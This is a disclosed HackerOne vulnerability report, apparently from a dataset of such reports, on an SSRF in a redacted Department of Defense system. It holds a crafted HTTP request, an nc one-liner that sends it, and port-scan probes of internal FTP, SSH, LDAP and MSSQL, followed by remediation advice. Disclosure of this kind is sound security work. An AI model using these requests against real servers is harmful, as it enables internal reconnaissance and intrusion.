---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '207477'
original_report_id: '207477'
title: SSRF in ███████
weakness: Server-Side Request Forgery (SSRF)
team_handle: deptofdefense
created_at: '2017-02-19T11:05:09.890Z'
disclosed_at: '2019-12-02T18:42:58.562Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 9
tags:
- hackerone
- server-side-request-forgery-ssrf
---

# SSRF in ███████

## Metadata

- HackerOne Report ID: 207477
- Weakness: Server-Side Request Forgery (SSRF)
- Program: deptofdefense
- Disclosed At: 2019-12-02T18:42:58.562Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

**Summary:** Server-Side Request Forgery (SSRF) vulnerability in the [██████](http://████/).

**Description:** By sending a specially crafted HTTP request, I can forcibly send a URL request from SSI server.

When sending the following HTTP request, access from the SSI server was logged on my server.

Request:
```http
GET http://██████████████████/ HTTP/1.1


```

You can send this HTTP request by executing following command.
>$ echo -ne "GET http\://██████████████/ HTTP/1.1\r\n\r\n" | nc █████████ 80

Response:
```http
HTTP/1.1 403 Forbidden
Cache-Control: no-cache
Pragma: no-cache
Content-Type: text/html; charset=utf-8
Proxy-Connection: Keep-Alive
Connection: Keep-Alive
Content-Length: 2628

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Access Denied</title>
```

Server Log:
███████

I judged from the information of the source IP address that it is accessed from the SSI server.
>$ whois ████████
>
>Organization:   ████
> ..
>OrgAbusePhone:  +███████
>OrgAbuseEmail:  █████\███████

## Impact
The attacker can force GET request to be transmitted to other services in the internal network. Furthermore, it is also used for port scan by Cross-Site Port Attack (XSPA).

For example, I could identify several services running on this server.

* FTP (port 20) and SSH (port 22) are running
    Request: `GET http://█████████:20/ HTTP/1.1`
    Response: `HTTP/1.1 503 Service Unavailable`

    Request: `GET http://██████████:21/ HTTP/1.1`
    Response: `Timeout`

    Request: `GET http://███:22/ HTTP/1.1`
    Response: `HTTP/1.1 503 Service Unavailable`

* LDAP (port 389) is running
    Request: `GET http://█████████:387/ HTTP/1.1`
    Response: `Timeout`

    Request: `GET http://█████:389/ HTTP/1.1`
    Response: `HTTP/1.1 503 Service Unavailable`

* MSSQL (port 1433) is running
    Request: `GET http://████████:1431/ HTTP/1.1`
    Response: `Timeout`

    Request: `GET http://█████:1433/ HTTP/1.1`
    Response: `HTTP/1.1 503 Service Unavailable`

## Suggested Remediation Actions
I assume that this behavior is caused not by the web server, but by the system located in front of it (e.g. cache server). In that system, if there is no Host header in the HTTP request (e.g. HTTP/0.9 support) it may be referring to an absolute-URI.

It is suggested that you change the setting of the cause system so that it does not refer to the absolute-URI of the HTTP request with no Host header.

>This white paper may help you identify the cause.
>http://www.cgisecurity.com/lib/HTTP-Request-Smuggling.pdf

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
